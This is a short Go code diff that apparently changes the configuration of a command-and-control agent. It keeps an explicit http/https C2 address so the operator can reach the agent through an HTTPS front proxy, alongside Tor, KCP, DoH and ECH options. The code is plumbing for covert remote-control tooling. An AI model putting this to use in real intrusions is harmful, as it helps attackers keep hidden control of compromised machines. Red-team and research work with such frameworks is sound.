@@ -54,8 +54,12 @@ func InitConfig() (err error) {
 	// HTTPS RR over DoH. Disabled when ECHServerName is empty.
 	transport.SetECHConfig(RuntimeConfig.ECHServerName, RuntimeConfig.DoHServer)
 
-	// CC Address
-	def.CCAddress = RuntimeConfig.CCAddress
+	// CC Address. An explicit http:// or https:// URL is authoritative: it lets
+	// http_poll use TLS (directly or through a TLS-terminating front proxy)
+	// without changing the channel wrapper.
+	def.CCAddress = strings.TrimSuffix(RuntimeConfig.CCAddress, "/")
+	explicitURL := strings.HasPrefix(def.CCAddress, "http://") ||
+		strings.HasPrefix(def.CCAddress, "https://")
 	isTor := netutil.IsTor(def.CCAddress)
 	if !isTor {
 		// check if it is an onion address without scheme
@@ -83,6 +87,9 @@ func InitConfig() (err error) {
 	} else if RuntimeConfig.UseKCP {
 		RuntimeConfig.CCH2Port = RuntimeConfig.KCPClientPort
 		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s", RuntimeConfig.CCH2Port)
+	} else if explicitURL {
+		// Keep the configured scheme, host and port. This is how an operator
+		// reaches http_poll through an HTTPS front proxy.
 	} else if RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
 		def.CCAddress = fmt.Sprintf("http://%s:%s", def.CCAddress, RuntimeConfig.CCHTTPPort)
 	} else {
